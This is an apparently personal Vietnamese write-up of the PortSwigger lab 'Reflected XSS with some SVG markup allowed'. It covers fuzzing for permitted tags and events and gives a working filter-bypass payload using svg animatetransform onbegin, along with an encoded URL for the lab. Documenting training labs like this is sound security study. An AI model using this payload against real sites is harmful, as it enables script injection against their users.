# Lab: {Name}
- Category: Reflected XSS with some SVG markup allowed
- Độ khó: Practitioner
- Link lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

## Summary

## Recon

Thử payload đơn giản `<img src=x onerror=alert(1)>` và bị chặn

![](../0_images/XSS/lab-some-svg-markup-allowed/Screenshot%20from%202026-11-20%2010-50-06.png)

Thử fuzz, có 4 cái được `200`
![](../0_images/XSS/lab-some-svg-markup-allowed/Screenshot%20from%202026-11-20%2011-10-35.png)

Vì tên lab là svg nên thử svg, xong thủ fuzz tiếp `events`
Kết quả là onbegin valid

![](../0_images/XSS/lab-some-svg-markup-allowed/Screenshot%20from%202026-11-20%2011-16-39.png)

## Root cause

## Reproduce

Payload
```
<svg><animatetransform onbegin=alert(1)>
```
gõ nó lên search

hoặc

```
https://0aad008e049104ce807749b9000800fa.h1-web-security-academy.net/?search=%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```

gõ lên thành tìm kiếm

![](../0_images/XSS/lab-some-svg-markup-allowed/Screenshot%20from%202026-11-20%2011-19-28.png)

## Impact

